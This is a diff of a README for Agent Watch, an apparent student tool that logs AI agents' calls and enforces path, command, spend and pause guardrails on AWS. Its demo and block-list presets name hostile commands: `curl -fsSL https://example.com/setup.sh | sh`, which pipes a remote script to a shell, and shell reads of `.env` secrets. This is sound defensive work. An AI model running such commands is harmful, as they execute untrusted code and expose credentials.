@@ -1,12 +1,70 @@
 # Agent Watch
 
-Agent Watch gives students one place to see, control, and cap what their AI agents do. Wrap an agent in three lines, and every LLM call and tool call shows up on a dashboard with its cost. Guardrails (a daily spend cap and a blocked-path list) are enforced in the SDK before the action runs, and an email goes out when one fires.
+Agent Watch gives students one place to see, control, and cap what their AI agents do. Wrap an agent in three lines, and every LLM call and tool call shows up on a dashboard with its cost. Guardrails (a blocked-path list, a blocked-command list, a daily spend cap, and a pause switch) are enforced in the SDK before the action runs, and an alert goes out by email, and optionally to Discord or Slack, when one fires.
+
+**The problem.** Students build agents on personal API keys with no security team and no budget for mistakes. Nothing shows them what the agent called, which files it touched, or what it cost. One runaway loop can drain a month's budget overnight, and one careless tool can read a `.env` file full of secrets or pipe a script from the internet into a shell.
 
 - `sdk/`: the `agentwatch` Python package (Python 3.11, `requests` only)
-- `backend/`: AWS SAM app. API Gateway HTTP API, one Lambda, DynamoDB single table, SNS email topic, and a $10 monthly AWS Budget
-- `dashboard/`: Next.js 14 static export on Amplify Hosting (inventory, agent timeline, rules editor)
-- `demo/`: `demo_agent.py` (well-behaved, Claude on Bedrock with an Anthropic API fallback) and `bad_agent.py` (tries to read `.env` and gets blocked)
+- `backend/`: AWS SAM app. API Gateway HTTP API, one Lambda, DynamoDB single table, SNS email topic, optional Discord/Slack webhook, and a $10 monthly AWS Budget
+- `dashboard/`: Next.js 14 static export on Amplify Hosting (inventory, agent overview with a spend chart, pause control, rules editor, timeline)
+- `demo/`: `demo_agent.py` (well-behaved, Claude on Bedrock with an Anthropic API fallback) and `bad_agent.py` (tries to read `.env` and to run `curl ... | sh`, and gets blocked both times)
+- `scripts/`: `verify_deploy.sh` (read-only post-deploy check) and `e2e.sh` (pre-recording smoke test)
 - `.kiro/`: the specs, steering, hooks, and MCP settings this was built with
+
+## How it works
+
+```
+agent code ── agentwatch SDK ──(wrapped call)──> Bedrock / Anthropic
+                   │  guardrails run here, before the call or tool
+                   │  HTTPS + credential headers
+                   v
+        API Gateway HTTP API ──> ApiFunction (Lambda) ──> DynamoDB (one table)
+                   ^                    │
+        dashboard (Amplify) ───────────┘ blocked events ──> SNS email
+                                          └───────────────> Discord / Slack webhook (optional)
+```
+
+Diagrams, the route table, the data model, and the design decisions are in `docs/ARCHITECTURE.md`.
+
+| Part | Technology | What it does |
+| --- | --- | --- |
+| SDK | Python 3.11, `requests` | Wraps the LLM client and tools, enforces guardrails, sends events |
+| API | API Gateway HTTP API (throttled 10 rps, burst 20) | Eight routes, all behind credential headers; CORS allows only the dashboard origin |
+| Logic | One Lambda, Python 3.11 on arm64 | Validates and stores events, computes cost, owns guardrail config and pause state, sends alerts |
+| Storage | DynamoDB, one table, on-demand | Agent records and events, plus a sparse owner index for the inventory |
+| Alerts | SNS email topic, optional Discord or Slack incoming webhook | One alert per newly stored blocked event |
+| Dashboard | Next.js 14 static export, TypeScript, Tailwind, Amplify Hosting | Reads and edits everything from the browser; no server runtime |
+| Infrastructure | AWS SAM (`backend/template.yaml`), AWS Budgets | One template, deployed to us-west-2 |
+| Tests | pytest + Hypothesis (38 design properties), vitest + Testing Library | No AWS or network needed |
+
+### How an agent connects and reports events
+
+1. `agentwatch.init(...)` takes the agent id, owner id, and API key. The key never leaves the process: only its SHA-256 is sent, in the `x-agentwatch-key-hash` header, next to `x-agentwatch-owner`. The server stores a hash of that hash.
+2. At start-up the SDK fetches the agent's guardrail config, its rolling 24h spend, and its pause state. It refreshes config and spend at most every 60 s and the pause state at most every 5 s, each timed from the last attempt.
+3. Every wrapped LLM call becomes an `llm_call` event (model and token counts, never prompt text) and every wrapped tool call a `tool_call` event. They are queued and sent by a background sender with retries, so a slow API never slows the agent.
+4. A block is reported as a `blocked` event, sent synchronously before the SDK raises, and the block happens even if the report fails.
+5. The first event from a new agent id registers it under that owner and key. The server computes every event's cost from its own pricing table, so a client can't under-report stored spend.
+
+### Guardrails
+
+All four run in the SDK before the call or tool runs. Wrapped calls raise a subclass of `agentwatch.GuardrailBlocked`, and the order is pause, then paths, then commands for tools, and pause, then spend for LLM calls.
+
+| Guardrail | Config | Raises | How it matches |
+| --- | --- | --- | --- |
+| Blocked paths | `blockedPaths`, a list of names and directories | `agentwatch.PathBlocked` | Every path-like tool argument, in absolute and symlink-resolved forms, NFC plus casefold. A name entry matches any path component; a directory entry matches by prefix and by inode |
+| Blocked commands | `blockedCommands`, up to 100 regexes | `agentwatch.CommandBlocked` | Every string tool argument, and every all-string list (an argv), is matched case-insensitively. Patterns are compiled once per config fetch. The dashboard's **Add presets** adds nine presets, including `pipe_to_shell` (`curl ... \| sh`) and `env_file` (reading `.env` through a shell) |
+| Daily spend cap | `dailySpendCapUsd`, or none | `agentwatch.SpendCapExceeded` | Before each LLM call: local rolling 24h spend plus a worst-case estimate for the pending call. Over the cap, the provider is never called |
+| Pause (kill switch) | Pause state on the agent record, set from the dashboard | `agentwatch.AgentPaused` | Checked before every LLM and tool call. One `paused` blocked event per pause episode, not one per blocked call |
+
+### Alerts
+
+When the API stores a new blocked event, it publishes one alert to SNS (email). If the `AlertWebhookUrl` stack parameter is set, the same alert also goes to the Discord or Slack webhook through a fan-out publisher: each channel is isolated, so a failing webhook never stops the email, and failures are logged by exception type only. Alert text includes the agent id, violation type, time, and the attempt (path, command, or spend), with control characters escaped. A duplicate event sends nothing.
+
+### Dashboard
+
+Sign in with the same owner id and API key the agent uses; the browser stores only `{ownerId, keyHash}`.
+- **Inventory**: **Agent**, **Model**, **Last activity** (marked "stale" after 24 h), **Total spend** (4 decimals), and **Status** (Paused or Active).
+- **Agent page**: an overview tile with rolling spend against the cap, a 24-hour spend chart with blocked calls marked, the pause control (**Pause agent**, then **Confirm pause**; **Resume agent** is one click), the rules editor (blocked paths, blocked commands with **Add presets**, daily spend cap, **Save rules**), and the timeline with a type filter and a **Details** toggle per row. The page refreshes every 30 s and after every change.
 
 ## 3-line integration
 
@@ -16,9 +74,9 @@ aw = agentwatch.init(agent_id="study-bot", owner_id="tejaswi", api_key=os.enviro
 client, TOOLS = aw.wrap(client), aw.tools(TOOLS)
 ```
 
-`aw.wrap(client)` accepts a Bedrock runtime client (`converse`) or an Anthropic client (`messages.create`). `aw.tools(TOOLS)` wraps a dict of tool functions. The endpoint comes from `AGENTWATCH_ENDPOINT`, or from `endpoint=` on `init`. The API key never leaves the process. Only its SHA-256 is sent, and the server stores a hash of that.
+`aw.wrap(client)` accepts a Bedrock runtime client (`converse`) or an Anthropic client (`messages.create`). `aw.tools(TOOLS)` wraps a dict of tool functions; `@aw.tool(path_arg=..., command_arg=...)` marks a single tool's path or command argument. The endpoint comes from `AGENTWATCH_ENDPOINT`, or from `endpoint=` on `init`.
 
-Wrapped calls can raise `agentwatch.PathBlocked` or `agentwatch.SpendCapExceeded`. Both subclass `GuardrailBlocked`.
+Wrapped calls can raise `agentwatch.PathBlocked`, `agentwatch.CommandBlocked`, `agentwatch.SpendCapExceeded`, or `agentwatch.AgentPaused`. All four subclass `agentwatch.GuardrailBlocked`.
 
 ## Deploy
 
@@ -33,31 +91,51 @@ Prerequisites: AWS CLI credentials for us-west-2, SAM CLI, Python 3.11, and Node
 2. Dashboard: connect the repo in AWS Amplify Hosting (platform `WEB`). The root `amplify.yml` is a monorepo spec with `appRoot: dashboard`. Set the env var `NEXT_PUBLIC_API_URL` to the `ApiUrl`. Amplify runs `npm ci` and `npm run build` and serves `out/`.
 3. CORS allows only `DashboardOrigin`. For local dashboard development against the deployed API, redeploy with `DashboardOrigin=http://localhost:3000`.
 
+Every later change set must pass `UsePreviousValue` for `AlertEmail`, `DashboardOrigin`, and `AlertWebhookUrl`, so no parameter falls back to its default.
+
 ### Webhook alerts
 
 Alerts can also go to a Discord or Slack channel, alongside the email. It's optional; leave it unset and only SNS email is used.
 
 1. Create an incoming webhook. Discord: Server Settings, Integrations, Webhooks, New Webhook, Copy Webhook URL. Slack: create an app with Incoming Webhooks enabled and add one to a channel.
-2. Treat the URL as a secret: anyone with it can post to your channel. Put it in an env var in your own terminal only, for example `export DISCORD_WEBHOOK_URL=...` (paste it at the prompt; never into a file, `samconfig.toml`, or chat).
-3. Deploy once with it as the `AlertWebhookUrl` parameter. It is `NoEcho`, so CloudFormation masks it:
+2. Treat the URL as a secret: anyone with it can post to your channel. Keep it out of chat, commits, `samconfig.toml`, and logs. Read it into your own shell without echoing it:
    ```bash
-   sam deploy --parameter-overrides AlertEmail=[email] DashboardOrigin=https://main.<app-id>.amplifyapp.com AlertWebhookUrl="$DISCORD_WEBHOOK_URL"
+   read -rs DISCORD_WEBHOOK_URL && export DISCORD_WEBHOOK_URL
    ```
-   Later change sets must keep it with `UsePreviousValue` (for example `ParameterKey=AlertWebhookUrl,UsePreviousValue=true` with `aws cloudformation create-change-set`), or it resets to empty.
+3. Don't pass it as a command-line argument (for example `--parameter-overrides AlertWebhookUrl=...`): while the command runs, its arguments are visible to anyone on the machine who can run `ps`. Instead, write the parameters to a temporary file that only you can read, create the change set from it, and delete the file. From `backend/`:
+   ```bash
+   sam build && sam package --resolve-s3 --output-template-file .aws-sam/packaged.yaml
+   PARAMS="$(mktemp)"   # created with mode 0600: readable only by you
+   python3 - "$PARAMS" <<'PY'
+   import json, os, sys
+   json.dump([{"ParameterKey": "AlertEmail", "UsePreviousValue": True},
+              {"ParameterKey": "DashboardOrigin", "UsePreviousValue": True},
+              {"ParameterKey": "AlertWebhookUrl", "ParameterValue": os.environ["DISCORD_WEBHOOK_URL"]}],
+             open(sys.argv[1], "w"))
+   PY
+   aws cloudformation create-change-set --stack-name agent-watch --change-set-name webhook-alerts \
+     --template-body file://.aws-sam/packaged.yaml --capabilities CAPABILITY_IAM CAPABILITY_AUTO_EXPAND \
+     --parameters "file://$PARAMS"
+   rm -f "$PARAMS"
+   ```
+   The value is read from the environment inside Python, so it never appears in a command's arguments. Review the change set with `aws cloudformation describe-change-set --stack-name agent-watch --change-set-name webhook-alerts --query 'Changes[].ResourceChange.[Action,LogicalResourceId,Replacement]'` (this prints no parameter values), and execute it with `aws cloudformation execute-change-set` only if nothing is replaced.
+4. Later change sets keep it with `ParameterKey=AlertWebhookUrl,UsePreviousValue=true`, or it resets to empty.
 
-Only `https://discord.com`, `https://discordapp.com`, and `https://hooks.slack.com` URLs are accepted. Any other value logs one `webhook_url_rejected` warning (without the URL) and sends nothing. A failing webhook never blocks the email.
+The parameter is `NoEcho`, so CloudFormation masks it in its own views. Only `https://discord.com`, `https://discordapp.com`, and `https://hooks.slack.com` URLs are accepted. Any other value logs one `webhook_url_rejected` warning (without the URL) and sends nothing. A failing webhook never blocks the email. Webhook text is capped at 1900 characters.
 
 ## Run the demos
 
 ```bash
 python3.11 -m venv .venv && source .venv/bin/activate
 pip install -r demo/requirements.txt
-export AGENTWATCH_ENDPOINT=<ApiUrl> AGENTWATCH_OWNER=<owner-id> AGENTWATCH_KEY=<your-key>
-python demo/bad_agent.py              # add ".env" to bad-bot's blocked paths first; prints PathBlocked, alert email arrives
-python demo/demo_agent.py --loop 5    # set a small daily cap on demo-bot first; stops on SpendCapExceeded
+export AGENTWATCH_ENDPOINT=<ApiUrl> AGENTWATCH_OWNER=<owner-id>
+export AGENTWATCH_KEY="$(cat ~/.agentwatch_key)"     # keep the key in a private file, never in the repo
+python demo/bad_agent.py                    # add ".env" and the pipe_to_shell preset to bad-bot first; prints PathBlocked, then CommandBlocked
+python demo/demo_agent.py --loop 5          # set a small daily cap on demo-bot first; stops on SpendCapExceeded
+python demo/demo_agent.py --loop 20 --sleep 2   # press Pause agent, then Confirm pause, on demo-bot; stops on AgentPaused
 ```
 
-Keep `AGENTWATCH_KEY` out of the repo. In the dashboard you enter the same owner id and key. The browser stores only the key's hash.
+In the dashboard you enter the same owner id and key. The browser stores only the key's hash.
 
 ## Run the tests
 
@@ -70,6 +148,29 @@ pip install -e "sdk[dev]" -r backend/requirements-dev.txt
 (cd dashboard && npm ci && npx vitest --run)
 ```
 
+## Verify a deployment
+
+Both scripts talk to the live stack. They read the API key only from `~/.agentwatch_key`, never print it or its hash, and need the repo's `.venv`. The endpoint and owner id are set inside each script for this project's deployment; change them there for your own stack.
+
+- `scripts/verify_deploy.sh` is read-only: `GET /agents/demo-bot/config`, printing only the HTTP status and the guardrail key names. Expect `VERIFY: PASS`.
+- `scripts/e2e.sh` is the pre-recording smoke test. It runs the three test suites, then the live demos: the path and command blocks on `bad-bot` and the spend cap on `demo-bot`. It checks that the blocked events were stored, and resets both agents in an exit trap. Expect `RESULT: PASS`. It sends real alerts (one email per block, and a webhook message each if one is configured), and its LLM cost is under a cent. It does not yet cover pause and resume.
+
+## Final demo
+
+The demo shows the moments below; `docs/DEMO_SCRIPT.md` is the step-by-step on-camera script.
+1. The 3-line integration and the inventory.
+2. `bad_agent.py` blocked reading `.env` (`PathBlocked`), then blocked running `curl -fsSL https://example.com/setup.sh | sh` (`CommandBlocked`), with the alert email and the Discord message.
+3. The kill switch: **Pause agent** on a looping `demo_agent.py` stops it with `AgentPaused`.
+4. The spend cap: `demo_agent.py --loop` stops with `SpendCapExceeded`, visible on the spend chart.
+5. The timeline of security events, and how it's built.
+
+## Not in this release
+
+These are in the v2 spec (`.kiro/specs/agent-watch-v2/`) but were cut from scope on 2026-10-17 and are not implemented. Nothing in the code, dashboard, or tests supports them.
+- **Per-agent LLM rate limit** (group 12): the `maxLlmCallsPerMinute` config key, the `RateLimitExceeded` exception, and `rate_limit` events.
+- **Onboarding CLI** (group 13): `agentwatch init` and `agentwatch doctor`, and credential discovery from `AGENTWATCH_KEY` or `~/.agentwatch_key` inside the SDK. Pass `api_key=` to `init` instead.
+- **Optional groups** 14 to 16: secret redaction in prompts, a domain allowlist for tools, CloudWatch alarms, and Streams-based alerts.
+
 ## Known limitations
 
 The SDK guards a careless agent, not a malicious one. Agent code that wants to bypass it can.
@@ -77,16 +178,26 @@ The SDK guards a careless agent, not a malicious one. Agent code that wants to b
 Path blocklist coverage:
 - It covers only tools wrapped with `aw.tools` / `aw.tool` that receive the path as an argument. A recognized path argument is one named `path`, `file_path`, `filepath`, `filename`, `file`, `src`, `dst`, `source`, `destination`, or `target_path`, or one set with `path_arg=`. Any other str/bytes/PathLike argument is also checked.
 - It does not cover direct `open()` calls in agent code, shell commands run by a tool (`subprocess`, `os.system`), or tools that build the path internally, for example from a config value or by joining strings inside the tool.
+- A path inside a shell string is not seen as a path: `blockedPaths: [".env"]` does not block `run_shell("cat .env")`. Add the `env_file` command preset to cover shell reads.
 - Matching is case-insensitive, so it over-blocks on case-sensitive filesystems: blocking `.env` also blocks `.ENV`. Every string argument is checked, so `search(".env")` is blocked even though it isn't a file read. Both errors fall on the safe side.
 - A hardlink to a blocked file under a different name is not caught by a name entry, since it really is a different name. A directory entry catches it only if the link lives inside the blocked directory.
 - Check-then-use (TOCTOU): if a symlink is swapped between the SDK's check and the tool's own `open()`, the swap is not caught.
+
+Command guard:
+- `blockedCommands` patterns are regexes matched against every string argument of a wrapped tool, not only shell commands, so a pattern can over-block a string that merely mentions a command (a note containing `rm -rf`). Like the path list, it covers only wrapped tools, and an agent that spawns processes itself is not checked.
 
 Spend cap:
 - The cap is enforced in the SDK process, from a local total resynced from the server at most every 60 s. During a sync, the local total can briefly under-count while completed LLM call events are still queued for sending. The server hasn't counted them yet.
 - The pending-call estimate is worst-case (`max_tokens` output), so the block can come one call early. Concurrent threads can each overshoot the cap by about one call, because check and accumulate are not atomic.
 - If no config fetch has ever succeeded, no guardrails are active. The SDK logs `agentwatch: guardrails NOT active (config fetch failed)`.
 
+Pause:
+- The SDK polls the pause state at most every 5 s and checks it before each call, so a pause takes effect up to 5 s plus one status request after it is pressed. A call already running is not interrupted. While no status fetch has succeeded, pause is not enforced and the SDK warns.
+
 Identity and alerts:
 - There is no user auth. Agent ids are global and first-come: the first owner id plus key to report an agent id owns it. `GET /agents/{agentId}/config` reveals whether a name is taken (403 if it belongs to someone else, an empty config if it is free).
-- Alerts are at-most-once. A Lambda crash between storing a blocked event and publishing to SNS loses that email. It never sends duplicates.
+- Alerts are at-most-once. A Lambda crash between storing a blocked event and publishing loses that alert. It never sends duplicates.
+- Alert channels are published one after another, so a hung webhook adds up to its 3 s timeout to that request. There is one webhook per stack, not per owner.
+- `NoEcho` masks the webhook URL in CloudFormation only. It is plaintext in the Lambda's environment configuration, readable by anyone with `lambda:GetFunctionConfiguration`. Secrets Manager would close that and is not used.
 - API throttling (10 rps, burst 20) is stage-wide, not per client.
+- The spend chart is computed in the browser from up to 20 pages (2000 events) of the timeline, which is enough at demo volume.
